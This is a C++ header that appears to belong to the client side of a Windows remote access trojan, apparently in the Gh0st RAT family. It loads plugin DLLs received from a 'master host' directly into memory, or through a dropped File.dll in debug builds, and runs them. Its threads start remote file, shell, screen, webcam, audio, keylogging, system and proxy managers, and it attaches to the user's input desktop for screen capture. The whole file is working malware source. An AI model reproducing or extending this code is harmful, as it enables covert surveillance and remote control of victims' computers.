#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED
#include "MyKernelManager.h"

#include <wininet.h>

extern HMODULE hSelf;
extern UINT BufSize;

typedef BOOL(*PluginMe)(LPCSTR lpszHost, UINT nPort, LPBYTE lpBuffer);
typedef BOOL(*PluginMeEx)(LPCSTR lpszHost, UINT nPort, LPBYTE lpBuffer, LPBYTE lpFun1, LPBYTE lpFun2, DWORD flags);

#include "MemLoadDll.h"

#ifndef _DEBUG
void LoadFromMemory(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
{
	HMEMORYMODULE HDll = MemoryLoadLibrary(data);
	if (HDll == NULL)
	{
		return;
	}

	CHAR lpHost[1024];
	WideCharToMultiByte(CP_OEMCP, NULL, lpszHost, -1, lpHost, 1024, NULL, FALSE);

	PluginMe myPluginMe = (PluginMe)MemoryGetProcAddress(HDll, "PluginMe");
	myPluginMe(lpHost, nPort, lpBuffer);
	MemoryFreeLibrary(HDll);

	//if (data) HeapFree(GetProcessHeap(), 0,data);
}

void LoadFromMemoryEx(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer, LPBYTE lpFun1, LPBYTE lpFun2, DWORD flags)
{
	HMEMORYMODULE module = MemoryLoadLibrary(data);
	if (module == NULL)
	{
		return;
	}

	CHAR lpHost[1024];
	WideCharToMultiByte(CP_OEMCP, NULL, lpszHost, -1, lpHost, 1024, NULL, FALSE);

	PluginMeEx myPluginMeEx = (PluginMeEx)MemoryGetProcAddress(module, "PluginMeEx");
	myPluginMeEx(lpHost, nPort, lpBuffer, lpFun1, lpFun2, flags);
	MemoryFreeLibrary(module);

	//if (data) HeapFree(GetProcessHeap(), 0,data);
}

#else

void LoadFromMemory(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
{
	DWORD rt;
	HANDLE h = CreateFile(_T("File.dll"), GENERIC_ALL, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(h, data, BufSize - 1, &rt, NULL);
	CloseHandle(h);

	HMODULE HDll;
	PluginMe myPluginMe;

	HDll = LoadLibrary(_T("File.dll"));

	if (HDll == NULL)
	{
		return;
	}

	myPluginMe = (PluginMe)GetProcAddress(HDll, "PluginMe");
	myPluginMe(lpszHost, nPort, lpBuffer);
	FreeLibrary(HDll);

	//if (data) HeapFree(GetProcessHeap(), 0,data);
}

void LoadFromMemoryEx(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer, LPBYTE lpFun1, LPBYTE lpFun2, DWORD flags)
{
	DWORD rt;
	HANDLE h = CreateFile(_T("File.dll"), GENERIC_ALL, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(h, data, BufSize - 1, &rt, NULL);
	CloseHandle(h);

	HMODULE module;
	PluginMeEx myPluginMeEx;

	module = LoadLibrary(_T("File.dll"));
	if (module == NULL)
	{
		return;
	}

	myPluginMeEx = (PluginMeEx)GetProcAddress(module, "PluginMeEx");
	myPluginMeEx(lpszHost, nPort, lpBuffer, lpFun1, lpFun2, flags);
	FreeLibrary(module);

	//if (data) HeapFree(GetProcessHeap(), 0,data);
}
#endif

BOOL WINAPI SelectDesktop()
{
	HDESK desktop = OpenInputDesktop(0, FALSE,
		DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
		DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
		DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
		DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);

	if (desktop != NULL)
	{
		SetThreadDesktop(desktop);
		CloseDesktop(desktop);
		return TRUE;
	}

	return FALSE;
}

DWORD WINAPI Loop_MyFileManager(LPVOID lparam)
{
	LoadFromMemory(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	return 0;
}

DWORD WINAPI Loop_MyShellManager(LPVOID lparam)
{
	LoadFromMemory(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	return 0;
}

DWORD WINAPI Loop_MyScreenManager(LPVOID lparam)
{
	SelectDesktop();

	LoadFromMemory(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	return 0;
}

// 摄像头不同一线程调用sendDIB的问题
DWORD WINAPI Loop_MyVideoManager(LPVOID lparam)
{
	LoadFromMemory(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	return 0;
}

DWORD WINAPI Loop_MyAudioManager(LPVOID lparam)
{
	LoadFromMemory(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	return 0;
}

DWORD WINAPI Loop_MyKeyboardManager(LPVOID lparam)
{
	LoadFromMemory(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, (LPBYTE)hSelf);
	return 0;
}

DWORD WINAPI Loop_MySystemManager(LPVOID lparam)
{
	LoadFromMemory(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	return 0;
}

DWORD WINAPI Loop_ProxyManager(LPVOID lparam)
{
	LoadFromMemory(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	Sleep(100);
	return 0;
}

extern TCHAR	svcname[MAX_PATH];

DWORD WINAPI Loop_MyTools(LPVOID lparam)
{
	SelectDesktop();

	LoadFromMemoryEx(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, (LPBYTE)lparam, (LPBYTE)svcname, NULL, NULL);
	Sleep(100);
	return 0;
}

#endif // !defined(AFX_LOOP_H_INCLUDED)
